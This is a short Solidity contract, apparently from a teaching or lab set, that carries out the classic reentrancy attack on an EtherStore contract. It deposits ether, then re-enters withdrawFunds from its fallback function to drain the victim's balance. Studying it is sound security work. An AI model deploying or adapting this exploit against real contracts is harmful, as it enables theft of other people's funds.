// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Reentrancy.sol";

contract ReentrancyAttack {
    EtherStore public etherStore;
    uint256 public amountToSteal;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherStore).balance >= amountToSteal) {
            etherStore.withdrawFunds(amountToSteal);
        }
    }

    function attack() public payable {
        amountToSteal = msg.value;
        etherStore.deposit{value: msg.value}();
        etherStore.withdrawFunds(amountToSteal);
    }
}